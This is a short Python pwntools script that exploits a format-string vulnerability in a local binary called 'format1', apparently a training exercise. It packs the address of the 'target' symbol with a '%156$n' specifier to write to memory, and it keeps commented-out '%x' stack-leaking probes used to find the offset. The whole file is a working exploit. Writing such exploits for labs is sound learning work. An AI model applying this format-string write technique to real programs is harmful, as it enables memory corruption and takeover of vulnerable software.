from pwn import * 
context.clear(arch="i386") 



b=ELF("./format1") 
log.info("target at: " + hex(b.symbols.target)) 
exploit_str = pack(b.symbols.target) + ' %156$n' 

'''
p = process(["./format1",'aaaaa' + ' %x'*2000])
p.interactive()


#exploit_str = 'aaaa' + ' %x'*1591
p = process("./format1") 
p.sendline('aaaa' + ' %x'*1591)
p.interactive()
'''
p = process(["./format1",exploit_str])
p.interactive()
